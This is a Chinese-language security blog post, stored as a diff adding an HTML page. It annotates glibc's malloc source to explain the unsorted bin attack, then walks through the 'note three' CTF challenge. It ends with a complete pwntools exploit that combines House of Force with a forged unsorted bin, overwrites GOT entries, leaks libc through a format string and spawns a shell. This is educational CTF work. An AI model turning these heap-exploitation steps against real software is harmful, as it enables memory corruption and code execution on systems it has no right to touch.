@@ -1,0 +1,774 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content>
+  <meta name="author" content="chumen77">
+  <meta name="keywords" content>
+  <title>Unsorted\_Bin\_Attack再学习 - Chumen77&#39;s Blog</title>
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
+
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css">
+  <link rel="stylesheet" href="/lib/hint/hint.min.css">
+
+  
+    
+    
+      
+      <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/atom-one-dark.min.css">
+    
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script src="/js/utils.js"></script>
+  <script src="/js/color-schema.js"></script>
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Chumen77's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-11-18 09:19" pubdate>
+        2020年11月18日 上午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.8k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      39
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">Unsorted\_Bin\_Attack再学习</h1>
+            
+            <div class="markdown-body" id="post-body">
+              <h1 id="Unsorted-Bin-Attack-再学习"><a href="#Unsorted-Bin-Attack-再学习" class="headerlink" title="Unsorted_Bin_Attack  再学习"></a><code>Unsorted_Bin_Attack</code>  再学习</h1><p>感觉自己对<code>Unsorted_Bin_Attack</code>掌握的不是很好，最初学习时，也没有对着源码进行学习分析。决定再总结和学习一下。</p>
+<h2 id="基本来源和知识"><a href="#基本来源和知识" class="headerlink" title="基本来源和知识"></a>基本来源和知识</h2><h3 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h3><ul>
+<li>当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。</li>
+<li>释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。</li>
+<li>当进行 <code>malloc_consolidate</code>时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 紧邻的话。</li>
+</ul>
+<h3 id="使用时的情况"><a href="#使用时的情况" class="headerlink" title="使用时的情况"></a>使用时的情况</h3><ul>
+<li>Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO，即插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取。</li>
+<li>在程序 malloc 时，如果在 fastbin，small bin 中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，否则就会把这些 chunk 分别插入到对应的 bin 中。</li>
+<li>unsorted bin遍历堆块的时候使用的是bk指针</li>
+</ul>
+<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><div class="hljs"><pre><code class="hljs c"><span class="hljs-comment">/*
+     Process recently freed or remaindered chunks, taking one only if
+     it is exact fit, or, if this a small request, the chunk is remainder from
+     the most recent non-exact fit.  Place other traversed chunks in
+     bins.  Note that this step is the only place in any routine where
+     chunks are placed in bins.
+	 进程最近释放的或剩余的chunks，仅在完全匹配的情况下才取走，或者，如果请求的字节很小，
+  则会选择最近一次非完全匹配的剩余chunk。将其他遍历的chunk分别插入到对应的 bin 中。
+  请注意，在任何例程中，此步骤是惟一一个将 chunk 放入对应的 bin 中的位置的步骤。
+
+     The outer loop here is needed because we might not realize until
+     near the end of malloc that we should have consolidated, so must
+     do so and retry. This happens at most once, and only when we would
+     otherwise need to expand memory to service a "small" request.
+	 这里需要外部循环的因为是：
+  我们可能直到接近malloc函数的末尾才可能意识到应该进行chunk合并，
+  所以我们必须反复尝试。这种情况最多只发生一次，并且只有当我们想这样做时才会发生，
+  否则，需要扩展内存来处理“小”请求。（分割top chunk之类的）
+   */</span>
+
+  <span class="hljs-keyword">for</span> (;; )
+    &#123;
+      <span class="hljs-keyword">int</span> iters = <span class="hljs-number">0</span>;
+      <span class="hljs-keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) <span class="hljs-comment">//从unsortbin第一个chunk（队尾）开始顺着bk指针向前遍历,其进行简单的判断，倘若不相等，证明unsortedbin中还存在chunk，则进入unsortedbin相关处理的循环。</span>
+        &#123;
+          bck = victim-&gt;bk; <span class="hljs-comment">//bck是倒数第二个，victim是倒数第一个</span>
+          <span class="hljs-keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)
+              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))
+            malloc_printerr (check_action, <span class="hljs-string">"malloc(): memory corruption"</span>,
+                             chunk2mem (victim), av); <span class="hljs-comment">//victim的size位进行检查，这个约束比较宽松，计算得到chunk实际大小</span>
+          size = chunksize (victim);  <span class="hljs-comment">////取出victim的size</span></code></pre></div>
+
+<p>接着是常遇到的情况，但是在unsortedbin attack中，bck被修改，这块代码并不会被执行：</p>
+<div class="hljs"><pre><code class="hljs c"><span class="hljs-comment">/*
+             If a small request, try to use last remainder if it is the
+             only chunk in unsorted bin.  This helps promote locality for
+             runs of consecutive small requests. This is the only
+             exception to best-fit, and applies only when there is
+             no exact fit for a small chunk.
+			  如果申请一个小的size，并且unsorted bin仅剩最后一个chunk时，会尝试使用该chunk
+        这有助于为连续的申请小size的行为提升局部性。这是best-fit的唯一例外，
+        并且只适用于没有对一个小size申请的情况。
+           */</span>
+			<span class="hljs-comment">/*假如我们申请的chunk属于small bin的范围，且last remainder是unsorted bin的唯一一个chunk时，
+		  我们优先使用这个块，如果该块满足条件则对其进行切割和解链操作。*/</span>
+		  <span class="hljs-comment">/* 显然，bck被修改，并不符合这里的要求，不会进入其中的代码*/</span>
+          <span class="hljs-keyword">if</span> (in_smallbin_range (nb) &amp;&amp;
+              bck == unsorted_chunks (av) &amp;&amp;
+              victim == av-&gt;last_remainder &amp;&amp;
+              (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (size) &gt; (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (nb + MINSIZE))
+            &#123;
+              <span class="hljs-comment">/* split and reattach remainder   分割或者将剩余的chunk合并 */</span>
+				
+              remainder_size = size - nb;
+              remainder = chunk_at_offset (victim, nb);
+              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;
+              av-&gt;last_remainder = remainder;
+              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);
+              <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))
+                &#123;
+                  remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;
+                  remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;
+                &#125;
+
+              set_head (victim, nb | PREV_INUSE |
+                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));
+              set_head (remainder, remainder_size | PREV_INUSE);
+              set_foot (remainder, remainder_size);
+
+              check_malloced_chunk (av, victim, nb);
+              <span class="hljs-keyword">void</span> *p = chunk2mem (victim);
+              alloc_perturb (p, bytes);
+              <span class="hljs-keyword">return</span> p;
+            &#125;</code></pre></div>
+
+<p>接着到了unsortedbin attack的关键处：</p>
+<div class="hljs"><pre><code class="hljs c">          unsorted_chunks (av)-&gt;bk = bck;
+          bck-&gt;fd = unsorted_chunks (av);
+<span class="hljs-comment">//unsorted_chunks (av)这里就是victim即最后一个chunk，当我们可以控制victim的bk指针时（即bck）</span>
+    	  <span class="hljs-comment">//就可以往bck-&gt;fd写入unsorted_chunks(av)即*(bck+0x10)=unsorted(av)</span>
+    	  <span class="hljs-comment">//要求bck是一个可写的地址，否则会crush</span></code></pre></div>
+
+<p>其也就是<code>*(bck+0x10)=unsorted(av)</code>，倘若篡改bk指针为<code>目标地址-0x10</code>，利用这里可以往目标处写入一个巨大的值。</p>
+<p><img src="http://qiqianyun.chumen77.xyz/uPic/FQa72u.png" srcset="/img/loading.gif" alt></p>
+<div class="hljs"><pre><code class="hljs undefined">（抄ScUpax0s师傅的图）</code></pre></div>
+
+<p>代码继续走，下面一个代码块是指如果我们请求的nb同victim的大小恰好吻合，就直接返回这个块给用户。</p>
+<div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (size == nb)
+           &#123;
+             set_inuse_bit_at_offset (victim, size);
+             <span class="hljs-keyword">if</span> (av != &amp;main_arena)
+               victim-&gt;size |= NON_MAIN_ARENA;
+             check_malloced_chunk (av, victim, nb);
+             <span class="hljs-keyword">void</span> *p = chunk2mem (victim);
+             alloc_perturb (p, bytes);
+             <span class="hljs-keyword">return</span> p;
+           &#125;</code></pre></div>
+
+<p>然后，如果之前的条件都不满足，意味着目前的victim不能满足用户的需求，需要根据其size放入small bin或large bin的链。</p>
+<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>触发时的申请的size要和free掉的size一样，否则将unsorted bin中的chunk放回对应的bin后，unsort bin的连续性会被破坏，也就过不了下面的check。</p>
+<div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)
+            || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))
+          malloc_printerr (check_action, <span class="hljs-string">"malloc(): memory corruption"</span>,</code></pre></div>
+
+<p>当原来申请chunk时，size刚好于unsortedbin相同：</p>
+<div class="hljs"><pre><code class="hljs c">
+<span class="hljs-keyword">if</span> (size == nb)
+  &#123;
+    set_inuse_bit_at_offset (victim, size);
+    <span class="hljs-keyword">if</span> (av != &amp;main_arena)
+      victim-&gt;size |= NON_MAIN_ARENA;
+    check_malloced_chunk (av, victim, nb);
+    <span class="hljs-keyword">void</span> *p = chunk2mem (victim);
+    alloc_perturb (p, bytes);
+    <span class="hljs-keyword">return</span> p;
+  &#125;</code></pre></div>
+
+<p>首先设置当前chunk 处于 inuse 状态，该标志位处于相邻的下一个 chunk 的 size 字段中。</p>
+<div class="hljs"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_inuse_bit_at_offset(p, s)					      \
+  (((mchunkptr) (((char *) (p)) + (s)))-&gt;size |= PREV_INUSE)</span></code></pre></div>
+
+<p>最后调用 chunk2mem()获得 chunk 中可用的内存指针，返回给应用层，退出。 就不会出现上面的错误。</p>
+<h2 id="黄鹤杯-note-three"><a href="#黄鹤杯-note-three" class="headerlink" title="黄鹤杯 note three"></a>黄鹤杯 note three</h2><p>基本国赛原题，no free，所以此处就只记录用unsortedbin attack打。</p>
+<h3 id="题目概述"><a href="#题目概述" class="headerlink" title="题目概述"></a>题目概述</h3><p>存在堆溢出，没有free show功能，先可以用HOF 改掉top size，借助多次分配让其进入unsortedbin，然后进行unsortedbin attack。</p>
+<h3 id="难点细节"><a href="#难点细节" class="headerlink" title="难点细节"></a>难点细节</h3><h4 id="难点1"><a href="#难点1" class="headerlink" title="难点1"></a>难点1</h4><p>HOF改size后，多次申请让top chunk 进unsorted bin。</p>
+<div class="hljs"><pre><code class="hljs c">
+<span class="hljs-keyword">if</span> (old_size != <span class="hljs-number">0</span>)
+  &#123;
+    <span class="hljs-comment">/*
+       Shrink old_top to insert fenceposts, keeping size a
+       multiple of MALLOC_ALIGNMENT. We know there is at least
+       enough space in old_top to do this.
+     */</span>
+    old_size = (old_size - <span class="hljs-number">4</span> * SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK; <span class="hljs-comment">//top chunk's old size -0x20</span>
+    set_head (old_top, old_size | PREV_INUSE);
+<span class="hljs-comment">/*
+   Note that the following assignments completely overwrite
+   old_top when old_size was previously MINSIZE.  This is
+   intentional. We need the fencepost, even if old_top otherwise gets
+   lost.
+ */</span>
+    chunk_at_offset (old_top, old_size)-&gt;size =
+    (<span class="hljs-number">2</span> * SIZE_SZ) | PREV_INUSE;
+
+    chunk_at_offset (old_top, old_size + <span class="hljs-number">2</span> * SIZE_SZ)-&gt;size =
+    (<span class="hljs-number">2</span> * SIZE_SZ) | PREV_INUSE;
+  <span class="hljs-comment">/* If possible, release the rest. */</span>
+      <span class="hljs-keyword">if</span> (old_size &gt;= MINSIZE)
+        &#123;
+            _int_free (av, old_top, <span class="hljs-number">1</span>); <span class="hljs-comment">//old_size =top chunk size - 0x20</span>
+        &#125;
+    &#125;</code></pre></div>
+
+<p>首先申请一个chunk，倘若top chunk 的size减去这个chunk的size &gt;=MINSIZE，其就正常的切割。<br>否则，其会告诉系统top chunk已经不够用了，需要申请一个新的内存页。<br>对于旧的top chunk的处理，会进入如上流程，可以看到在旧的top chunk  size在 减去0x20后，倘若其是大于0x20的，就会被放入bin中。</p>
+<p>倘若起大于0x80，就会被放入unsorted bin，也是为接下来攻击做准备。</p>
+<h4 id="难点2"><a href="#难点2" class="headerlink" title="难点2"></a>难点2</h4><p>Unsortedbin attack如前面所示，也就可以实现往一个地址写上一个main arenas的地址，仅使用这个地址是怎么能完成拿shell的攻击的。先看下其写入的地址信息：</p>
+<div class="hljs"><pre><code class="hljs c">gef➤  x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x00007f99bb194b78</span>
+<span class="hljs-number">0x7f99bb194b78</span> &lt;main_arena+<span class="hljs-number">88</span>&gt;: <span class="hljs-number">0x0000000000602030</span>      <span class="hljs-number">0x0000000000000000</span>
+<span class="hljs-number">0x7f99bb194b88</span> &lt;main_arena+<span class="hljs-number">104</span>&gt;:        <span class="hljs-number">0x0000000001cccf50</span>      <span class="hljs-number">0x00000000006021b0</span>
+<span class="hljs-number">0x7f99bb194b98</span> &lt;main_arena+<span class="hljs-number">120</span>&gt;:        <span class="hljs-number">0x00007f99bb194b88</span>      <span class="hljs-number">0x00007f99bb194b88</span>
+<span class="hljs-number">0x7f99bb194ba8</span> &lt;main_arena+<span class="hljs-number">136</span>&gt;:        <span class="hljs-number">0x00007f99bb194b98</span>      <span class="hljs-number">0x00007f99bb194b98</span>
+<span class="hljs-number">0x7f99bb194bb8</span> &lt;main_arena+<span class="hljs-number">152</span>&gt;:        <span class="hljs-number">0x00007f99bb194ba8</span>      <span class="hljs-number">0x00007f99bb194ba8</span>
+<span class="hljs-number">0x7f99bb194bc8</span> &lt;main_arena+<span class="hljs-number">168</span>&gt;:        <span class="hljs-number">0x00007f99bb194bb8</span>      <span class="hljs-number">0x00007f99bb194bb8</span></code></pre></div>
+
+<p>会发现其写入的是<code>main_arena+88</code>，这紧邻着就是<code>top chunk last_remainder unsortedbin&#39;s fd bk</code></p>
+<p>事情就变得有意思起来，这块top chunk已经废了（并没有办法将其设置为合适的值来进行利用），<code>last_remainder</code>用途不是很大，<strong>unsortedbin’s fd 和bk 设置好的话，可以伪造出一个unsorted bin，接着再申请相同大小的chunk，即可拿到这个伪造的unsorted bin</strong>。</p>
+<p>其中需要注意的是仍需要绕过unsortbin 一些检查，其中很重要的检查就是保证fake unsorted bin的bck<strong>需要是一个可写的地址</strong>。这点也很容易做到，我们的输入首先会放在bss上，完全可以通过输入来伪造<code>fake_ unsorted bin</code>及其bk对应的堆块。</p>
+<p>所以，先利用unsortbin attack往heaplist上打上<code>main_arena+88</code>，然后edit来控制<code>main_arena+88</code>附近的内存，伪造出一个unsorted bin，其指向heaplist 附近，目标也就是控制到heaplist。</p>
+<p>然后在申请chunk时，用往bss段写的数据，来通过相关检查，接着获得一个在heaplist附近的chunk。利用这样的unsortbin attack来完成攻击。</p>
+<p>剩下的就好说了，可以看exp。</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span>
+<span class="hljs-comment"># encoding: utf-8</span>
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">import</span> time
+local_file  = <span class="hljs-string">'./note_three'</span>
+elf = ELF(local_file)
+context.log_level = <span class="hljs-string">'debug'</span>
+debug = <span class="hljs-number">1</span>
+<span class="hljs-keyword">if</span> debug:
+    io = process(local_file)
+    libc = elf.libc
+<span class="hljs-keyword">else</span>:
+    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27411</span>)
+    libc = elf.libc
+    <span class="hljs-comment">#libc = ELF('.')</span>
+context.arch = elf.arch
+context.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]
+<span class="hljs-comment">#,''splitw','-h'</span>
+rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]
+rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]
+realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]
+arae16 = <span class="hljs-number">0x3c4b78</span>
+arae18 = <span class="hljs-number">0x3ebca0</span>
+s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) 
+sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
+sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
+sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
+r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)
+ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
+uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))
+uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))
+info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))
+itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>
+    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>
+    gdb.attach(io)
+    pause()
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,size,content)</span>:</span>
+    io.recvuntil(<span class="hljs-string">'choice&gt;&gt; '</span>)
+    io.sendline(<span class="hljs-string">'1'</span>)
+    io.recvuntil(<span class="hljs-string">"idx: "</span>)
+    io.sendline(str(idx))
+    io.recvuntil(<span class="hljs-string">"size: "</span>)
+    io.sendline(str(size))
+    io.recvuntil(<span class="hljs-string">"content: "</span>)
+    io.send(str(content))
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,content)</span>:</span>
+    io.recvuntil(<span class="hljs-string">'choice&gt;&gt; '</span>)
+    io.sendline(<span class="hljs-string">'2'</span>)
+    io.recvuntil(<span class="hljs-string">"idx: "</span>)
+    io.sendline(str(idx))
+    io.recvuntil(<span class="hljs-string">"content: "</span>)
+    io.send(str(content))
+
+add(<span class="hljs-number">0</span>,<span class="hljs-number">0x90</span>,<span class="hljs-string">'1'</span>*<span class="hljs-number">0x18</span>)
+edit(<span class="hljs-number">0</span>,<span class="hljs-string">'\x00'</span>*<span class="hljs-number">0x28</span> + p64(<span class="hljs-number">0xfd1</span>))
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0x17</span>):
+    add(<span class="hljs-number">1</span>,<span class="hljs-number">0x90</span>,<span class="hljs-string">'1'</span>*<span class="hljs-number">0x90</span>)
+add(<span class="hljs-number">1</span>,<span class="hljs-number">0x90</span>,<span class="hljs-string">'1'</span>*<span class="hljs-number">0x70</span>)
+add(<span class="hljs-number">2</span>,<span class="hljs-number">0x90</span>,<span class="hljs-string">'1'</span>*<span class="hljs-number">0x30</span>) <span class="hljs-comment">#切割用，切割后 top chunk 0xb1</span>
+debug()
+add(<span class="hljs-number">1</span>,<span class="hljs-number">0x90</span>,<span class="hljs-string">'1'</span>*<span class="hljs-number">0x90</span>)
+debug()
+payload = <span class="hljs-string">'\x00'</span> * <span class="hljs-number">0x38</span> + p64(<span class="hljs-number">0x91</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x6021b0</span>)
+edit(<span class="hljs-number">2</span>,payload)
+add(<span class="hljs-number">1</span>,<span class="hljs-number">0x90</span>,<span class="hljs-string">'1'</span>*<span class="hljs-number">0x80</span>) <span class="hljs-comment">#申请和进入unsortedbin大小一样的chunk</span>
+<span class="hljs-comment"># add(1,0x90,'1'*0x81)</span>
+
+edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x6020c0</span>+<span class="hljs-number">0x70</span>)*<span class="hljs-number">2</span>) <span class="hljs-comment">#伪造main_arena+88 其中top chunk的地址并不重要，写0即可，重要是伪造unsortedbin</span>
+add(<span class="hljs-number">2</span>,<span class="hljs-number">0x90</span>,<span class="hljs-string">'a'</span>*<span class="hljs-number">0x78</span> +p64(<span class="hljs-number">0x91</span>)+p64(<span class="hljs-number">0x6021b0</span>)*<span class="hljs-number">2</span>)
+debug()
+<span class="hljs-comment">#攻击heaplist 实现任意地址写</span>
+payload = <span class="hljs-string">'\x00'</span> * <span class="hljs-number">0x80</span> + p64(<span class="hljs-number">0x6021c0</span>)
+edit(<span class="hljs-number">2</span>,payload)
+
+edit(<span class="hljs-number">0</span>,p64(elf.got[<span class="hljs-string">'atoi'</span>]) + p64(<span class="hljs-number">0x90</span>) + p64(elf.got[<span class="hljs-string">'atoi'</span>])+p64(<span class="hljs-number">0x90</span>) + p64(elf.got[<span class="hljs-string">'atoi'</span>]))
+
+edit(<span class="hljs-number">0</span>,p64(elf.plt[<span class="hljs-string">'printf'</span>]))
+sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)
+payload = <span class="hljs-string">'aaaa%7$s'</span> + p64(<span class="hljs-number">0x000000000602018</span>)
+sa(<span class="hljs-string">'idx'</span>,payload)
+r(<span class="hljs-number">4</span>)
+r(<span class="hljs-number">4</span>)
+libc_base = uu64(r(<span class="hljs-number">6</span>)) - libc.sym[<span class="hljs-string">'puts'</span>]
+info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)
+sys = libc_base + libc.sym[<span class="hljs-string">'system'</span>]
+<span class="hljs-comment"># debug()</span>
+edit(<span class="hljs-number">1</span>,p64(sys))
+s(<span class="hljs-string">'sh'</span>)
+itr()</code></pre></div>
+
+<h3 id="题记"><a href="#题记" class="headerlink" title="题记"></a>题记</h3><p>此题这样的利用手法，十分的精巧和新奇，但是也十分依赖程序本身申请chunk的特性，使其成了其不是大众攻击的手段。</p>
+<h2 id="总结用途"><a href="#总结用途" class="headerlink" title="总结用途"></a>总结用途</h2><ul>
+<li>通过修改循环的次数来使得程序可以执行多次循环。</li>
+<li>可以修改 heap 中的<code>global_max_fast</code> 来使得更大的 chunk 可以被视为 fast bin，去执行一些 fast bin attack </li>
+<li>作为FSOP的前奏</li>
+<li>在可编辑的时候，劫持<code>main_arena+88</code> 也是一种新奇的攻击手段</li>
+</ul>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/pwn/">pwn</a>
+                    
+                      <a class="hover-with-bg" href="/tags/学习记录/">学习记录</a>
+                    
+                      <a class="hover-with-bg" href="/tags/unsortedbin/">unsortedbin</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/11/23/祥云杯2020CTF部分pwn wp/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">祥云杯2020CTF部分pwn wp</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/11/14/第六届上海市网络安全邀请赛2020CTF部分wp/">
+                        <span class="hidden-mobile">第六届上海市网络安全邀请赛2020CTF部分wp</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
